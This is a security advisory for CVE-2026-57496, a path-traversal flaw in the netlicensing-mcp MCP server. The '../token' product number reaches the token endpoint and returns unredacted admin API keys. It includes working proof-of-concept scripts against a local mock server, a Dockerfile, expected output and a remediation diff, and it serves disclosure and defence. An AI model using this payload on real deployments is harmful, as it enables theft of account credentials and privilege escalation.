# [C] netlicensing-mcp: REST Path Traversal Bypasses Token Redaction

## Summary
Severity: Critical
Advisory: GHSA-hxpf-9xvq-wph8
CVE: CVE-2026-57496
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-hxpf-9xvq-wph8
Type: github-advisory

## Affected
- PyPI: `netlicensing-mcp` — affected >=0 <0.1.8

## Details
## REST Path Traversal Bypasses Token Redaction in netlicensing-mcp

### Summary

The `netlicensing_get_product` MCP tool in `netlicensing-mcp` interpolates a caller-controlled `product_number` argument directly into a REST URL path without any validation. Passing `../token` as the product number causes `httpx` to normalize `/product/../token` into `/token`, silently redirecting the request to the NetLicensing token endpoint instead of the intended product endpoint. The response is then serialized through the generic `_wrap_json` wrapper rather than the token-specific `_wrap_json_token_read` wrapper, bypassing all APIKEY `number` and SHOP `shopURL` redaction. An authenticated MCP client can recover plaintext API key values that the token read tools intentionally mask, including admin-level APIKEY credentials. 

### Details

The vulnerability is a path traversal (CWE-22) that exploits the interaction between unsanitized string interpolation and `httpx`'s WHATWG URL normalization.

**Source — `src/netlicensing_mcp/tools/products.py:22`**

```python
async def get_product(product_number: str) -> dict:
    """Get a single product by its number."""
    return strip_output_fields(await nl_get(f"/product/{product_number}"))
```

`product_number` is inserted directly into the REST path with no validation. A value of `../token` produces the path `/product/../token`.

**Sink — `src/netlicensing_mcp/client.py:143`**

```python
async def nl_get(path: str, params: dict[str, str] | None = None) -> dict[str, Any]:
    client = _get_client()
    url = f"{BASE_URL}{path}"
    ...
    r = await client.get(url, headers=_headers(), params=params or {})
```

`httpx` constructs the full URL as `{BASE_URL}/product/../token` and, per WHATWG URL normalization rules applied to absolute URLs, resolves it to `{BASE_URL}/token`. The HTTP request is therefore sent to the NetLicensing `/core/v2/rest/token` endpoint.

**Redaction bypass — `src/netlicensing_mcp/server.py:336` and `src/netlicensing_mcp/redaction.py:180-239`**

The tool handler wraps the response via `_wrap_json(entity, "Product")`, which calls only the generic `_json()` redaction. The token-specific path `_wrap_json_token_read()` → `redact_token_read()` is never invoked. The function `redact_token_read()` at `redaction.py:180-239` is the only code that masks APIKEY `number` and SHOP `shopURL` fields; because it is not on this code path, the raw API key value is returned verbatim in the MCP tool output.

**Complete data flow:**

1. `server.py:312-321` — MCP dispatcher receives attacker-controlled `product_number` and calls `products.get_product(product_number)`.
2. `tools/products.py:22` — value interpolated into `f"/product/{product_number}"` without validation.
3. `client.py:143` — `url = f"{BASE_URL}{path}"`; `httpx` normalizes `../` and sends request to `/token` endpoint.
4. `server.py:336` — response wrapped as `"Product"` via `_wrap_json`, not `_wrap_json_token_read`.
5. `server.py:160-165` — generic `_json()` redaction applies only default-field masking.
6. `redaction.py:180-239` — `redact_token_read()` with APIKEY/SHOP-specific masking is never reached.

### PoC

**Prerequisites**

- Python 3.10+
- `netlicensing-mcp` 0.1.5 (or local commit `c8a3fec`) installed or available via `PYTHONPATH`
- `httpx`, `python-dotenv`, `mcp[cli]` installed

**Option A — Docker (recommended, reproduces Phase 2 result)**

```bash
# Build from the repository root (requires repo/ and vuln-001/ directories)
docker build -t netlicensing-vuln-001 \
  -f vuln-001/Dockerfile \
  reports/pypiAi_1561_Labs64__NetLicensing-MCP/

# Run — exit code 0 confirms the vulnerability
docker run --rm netlicensing-vuln-001
```

**Option B — Direct Python**

```bash
cd /path/to/Labs64__NetLicensing-MCP
PYTHONPATH=src python3 - <<'PY'
import asyncio, json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

seen = []
secret = "actual-api-key-value-5678"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        seen.append(self.path)
        if self.path.endswith("/token"):
            body = {"items":{"item":[{"type":"Token","property":[
                {"name":"number","value":secret},
                {"name":"tokenType","value":"APIKEY"},
                {"name":"role","value":"ROLE_APIKEY_ADMIN"},
                {"name":"active","value":"true"}
            ]}]}}
            data = json.dumps(body).encode()
            self.send_response(200)
            self.send_header("Content-Type","application/json")
            self.send_header("Content-Length",str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *args): pass

srv = HTTPServer(("127.0.0.1", 0), Handler)
threading.Thread(target=srv.serve_forever, daemon=True).start()

async def main():
    import netlicensing_mcp.client as c
    c.BASE_URL = f"http://127.0.0.1:{srv.server_port}/core/v2/rest"
    tok = c.api_key_ctx.set("dummy")
    try:
        from netlicensing_mcp.server import netlicensing_get_product
        out = await netlicensing_get_product("../token")
        print("UPSTREAM_PATH=" + seen[0])
        print("SECRET_LEAKED=" + str(secret in out))
        print(out)
    finally:
        c.api_key_ctx.reset(tok)
        await c.close_client()
        srv.shutdown()

asyncio.run(main())
PY
```

**Expected output**

```text
UPSTREAM_PATH=/core/v2/rest/token
PATH_TRAVERSAL_OK=True
SECRET_LEAKED=True

=== MCP tool output (netlicensing_get_product('../token')) ===
{
  "number": "actual-api-key-value-5678",
  "tokenType": "APIKEY",
  "role": "ROLE_APIKEY_ADMIN",
  "active": true,
  "type": "Token",
  "console_url": "https://ui.netlicensing.io/#/tokens/actual-api-key-value-5678",
  "warnings": [],
  "suggested_actions": []
}
[PASS] VULN-001 CONFIRMED: path traversal reached /token endpoint and plaintext secret 'actual-api-key-value-5678' is present in MCP output
```

The `number` field contains the raw API key value and `console_url` embeds it in plaintext — both fields that `redact_token_read()` would otherwise mask.

**Remediation**

Add a centralized path-segment validator in `client.py` and call it from all HTTP helper functions (`nl_get`, `nl_post`, `nl_put`, `nl_delete`):

```diff
+from urllib.parse import unquote
+
+def _validated_path(path: str) -> str:
+    if not path.startswith("/"):
+        raise NetLicensingError(400, "Internal error: upstream path must start with '/'")
+    for segment in path.split("/"):
+        decoded = unquote(segment)
+        if decoded in {".", ".."} or "/" in decoded or "\\" in decoded:
+            raise NetLicensingError(400, "Invalid identifier: path separators are not allowed")
+        if any(ord(ch) < 32 for ch in decoded):
+            raise NetLicensingError(400, "Invalid identifier: control characters are not allowed")
+    return path
+
 async def nl_get(path: str, ...) -> dict[str, Any]:
-    url = f"{BASE_URL}{path}"
+    url = f"{BASE_URL}{_validated_path(path)}"
```

Apply the same change to `nl_post`, `nl_put`, and `nl_delete`. Add regression tests for inputs `../token`, `%2e%2e`, `%2f`, and `x/y`.

### Impact

An authenticated MCP client (one that already holds a NetLicensing API key sufficient to call any MCP tool) can call `netlicensing_get_product("../token")` to retrieve plaintext APIKEY `number` values and SHOP `shopURL` values that the dedicated token read tools (`netlicensing_get_token`, `netlicensing_list_tokens`) intentionally redact. If the retrieved token carries `ROLE_APIKEY_ADMIN` privileges, the attacker gains full read/write/delete access over all resources in the target NetLicensing account, escalating from a scoped MCP client to account owner.

This vulnerability is exploitable in any deployment mode — stdio (single-user) and HTTP/shared — because no non-default configuration is required. The attack requires only a valid API key to authenticate the MCP session; no admin privileges are needed to trigger the traversal.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

WORKDIR /app

# Copy the cloned repository source
COPY repo/ /app/repo/

# Install runtime dependencies directly to avoid hatch-vcs version-detection
# issues when building outside a proper git-tagged worktree.
RUN pip install --no-cache-dir \
    "httpx>=0.27.0" \
    "python-dotenv>=1.0.0" \
    "mcp[cli]>=1.7.0"

# Make the package importable via PYTHONPATH (avoids editable-install build step)
ENV PYTHONPATH=/app/repo/src

# Copy the proof-of-concept script
COPY vuln-001/poc.py /app/poc.py

# Exit code 0 = PASS (secret leaked), 1 = FAIL
CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 Proof of Concept: REST Path Traversal Bypasses Token Redaction
=======================================================================
Vulnerability: netlicensing_get_product(product_number="../token")

Attack flow:
  1. product_number="../token" is interpolated into f"/product/{product_number}"
     => path = "/product/../token"
  2. client.py builds url = f"{BASE_URL}/product/../token"
  3. httpx normalizes the URL per WHATWG: /product/../token => /token
     => actual HTTP request lands on BASE_URL/token (the token endpoint)
  4. Response is wrapped via _wrap_json(..., "Product") which calls _json()
     => only default-field redaction (apiKey, secret, etc.) runs
     => _wrap_json_token_read() / redact_token_read() is NEVER called
  5. APIKEY token "number" field (= the raw API key value) is returned in
     plaintext in the MCP tool output.

Expected exit codes:
  0 — PASS: path traversal confirmed AND secret found in MCP output
  1 — FAIL: could not confirm the vulnerability
"""

import asyncio
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Sentinel value used as the fake APIKEY token number (the "leaked secret").
SECRET_APIKEY = "actual-api-key-value-5678"

# Collects every upstream request path received by the mock server.
seen_paths: list[str] = []


class MockNetLicensingHandler(BaseHTTPRequestHandler):
    """Minimal mock of the NetLicensing REST API for PoC isolation."""

    def do_GET(self) -> None:
        seen_paths.append(self.path)

        # Respond to ANY path ending with "/token" to capture both the
        # normalized (/core/v2/rest/token) and raw (/core/v2/rest/product/../token)
        # cases — in practice httpx always sends the normalized form.
        if self.path.endswith("/token"):
            body: dict = {
                "items": {
                    "item": [
                        {
                            "type": "Token",
                            "property": [
                                {"name": "number", "value": SECRET_APIKEY},
                                {"name": "tokenType", "value": "APIKEY"},
                                {"name": "role", "value": "ROLE_APIKEY_ADMIN"},
                                {"name": "active", "value": "true"},
                            ],
                        }
                    ]
                }
            }
            data = json.dumps(body).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *args: object) -> None:
        pass  # Suppress per-request log noise


async def run_poc(server_port: int) -> bool:
    """
    Invoke the vulnerable MCP tool with the traversal payload and check
    whether the upstream path was normalized and the secret leaked.

    Returns True when both conditions are confirmed.
    """
    import netlicensing_mcp.client as client
    from netlicensing_mcp.server import netlicensing_get_product

    # Redirect the HTTP client to the mock server.
    original_base_url = client.BASE_URL
    client.BASE_URL = f"http://127.0.0.1:{server_port}/core/v2/rest"

    # Inject a dummy API key so _headers() does not raise a 503.
    ctx_token = client.api_key_ctx.set("dummy-key-for-poc")
    try:
        # ---- THE EXPLOIT ------------------------------------------------
        # Pass "../token" as product_number.
        # products.get_product calls nl_get(f"/product/../token")
        # httpx normalizes /product/../token -> /token
        # The request hits /core/v2/rest/token on the mock server.
        # The response is serialized via _wrap_json (not _wrap_json_token_read)
        # so the APIKEY "number" field is NOT masked.
        # -----------------------------------------------------------------
        result: str = await netlicensing_get_product("../token")

        upstream_path = seen_paths[0] if seen_paths else "(none received)"
        path_traversal_ok = upstream_path == "/core/v2/rest/token"
        secret_in_output = SECRET_APIKEY in result

        print(f"UPSTREAM_PATH={upstream_path}")
        print(f"PATH_TRAVERSAL_OK={path_traversal_ok}")
        print(f"SECRET_LEAKED={secret_in_output}")
        print()
        print("=== MCP tool output (netlicensing_get_product('../token')) ===")
        print(result)
        print("=== end ===")

        if path_traversal_ok and secret_in_output:
            print()
            print(
                "[PASS] VULN-001 CONFIRMED: path traversal reached /token endpoint "
                f"and plaintext secret '{SECRET_APIKEY}' is present in MCP output"
            )
        else:
            if not path_traversal_ok:
                print(
                    f"[FAIL] Path traversal did not work: upstream_path={upstream_path!r}, "
                    "expected /core/v2/rest/token"
                )
            if not secret_in_output:
                print(
                    f"[FAIL] Secret '{SECRET_APIKEY}' not found in MCP output — "
                    "redaction may have been applied unexpectedly"
                )

        return path_traversal_ok and secret_in_output

    finally:
        client.api_key_ctx.reset(ctx_token)
        await client.close_client()
        client.BASE_URL = original_base_url


def main() -> None:
    # Bind the mock server on a random loopback port.
    mock_server = HTTPServer(("127.0.0.1", 0), MockNetLicensingHandler)
    port: int = mock_server.server_address[1]

    server_thread = threading.Thread(target=mock_server.serve_forever, daemon=True)
    server_thread.start()

    print(f"[*] Mock NetLicensing REST API listening on 127.0.0.1:{port}")
    print(f"[*] Invoking netlicensing_get_product(product_number='../token')")
    print()

    try:
        success = asyncio.run(run_poc(port))
    finally:
        mock_server.shutdown()

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/Labs64/NetLicensing-MCP/security/advisories/GHSA-hxpf-9xvq-wph8
- https://github.com/Labs64/NetLicensing-MCP
